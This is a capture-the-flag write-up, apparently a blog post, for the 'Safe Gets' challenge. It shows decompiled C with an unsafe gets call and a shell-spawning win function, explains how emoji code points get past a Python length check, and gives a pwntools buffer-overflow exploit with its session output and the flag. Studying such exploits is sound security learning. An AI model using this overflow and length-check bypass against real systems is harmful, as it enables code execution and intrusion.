+++
date = '2025-07-14T09:16:19+02:00'
draft = false 
title = 'Safe Gets'
tags = [ "pwn" ]
+++

description: I think I found a way to make gets safe.
Author: White

We are given a program and a python wrapper around it.  

## Main program

Let's start with the program after a quick pass through ghidra
```C
int main(void)
{
  size_t input_len;
  char buffer [259];
  char local_15;
  int input_len_2;
  ulong i;
  
  gets(buffer);
  input_len = strlen(buffer);
  input_len_2 = (int)input_len;
  for (i = 0; i < (ulong)(long)(input_len_2 / 2); i = i + 1) {
    local_15 = buffer[(long)(input_len_2 + -1) - i];
    buffer[(long)(input_len_2 + -1) - i] = buffer[i];
    buffer[i] = local_15;
  }
  puts("Reversed string:");
  puts(buffer);
  return 0;
}

void win(void)
{
  system("/bin/sh");
  return;
}
```

It's a simple compiled C program that reverses a string, the interesting thing is the call to `gets` that allows us to overflow the buffer overwrite the return pointer and jump to the beautiful `win` function.  
No binary protections are stopping us from doing this except the python wrapper the program is launched from.
```
[*] 'l3ak_ctf/pwn/safe_gets/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## Python wrapper

Most of it doesn't matter for us except this small part that limits the length of the input we provide to 255.
```python
BINARY = "./chall"
MAX_LEN = 0xff

# Get input from user
payload = input(f"Enter your input (max {MAX_LEN} bytes): ")
if len(payload) > MAX_LEN:
    print("[-] Input too long!")
    sys.exit(1)
```

Thus the tricky part is to bypass this limit because we need to write at least 275 chars to have a big enough overflow.  

## Solve

So what does the `len` function count ? It counts unicode codepoints which can be multiple bytes long.  
So I replace the part of my payload responsible for filling up the buffer by 😄 emojis and after solving a stack alignment problem I get a shell and the flag.  

Here is my solve script (the interesting part).
```python
io = start()
payload = flat(
        b"A"*74,
        b"\x00",
        "😄".encode("utf-8")*50,
        b"A"*5,
        pack((elf.symbols.win)+5)
        )
io.sendlineafter(b"Enter your input (max 255 bytes): ", payload)
io.interactive()
```
And when running it we get the flag.
```
>>> ./exploit.py REMOTE 34.45.81.67 16002
[+] Opening connection to 34.45.81.67 on port 16002: Done
[*] Switching to interactive mode
$ cat flag.txt
L3AK{6375_15_4pp4r3n7ly_n3v3r_54f3}
[*] Interrupted
[*] Closed connection to 34.45.81.67 port 16002
```

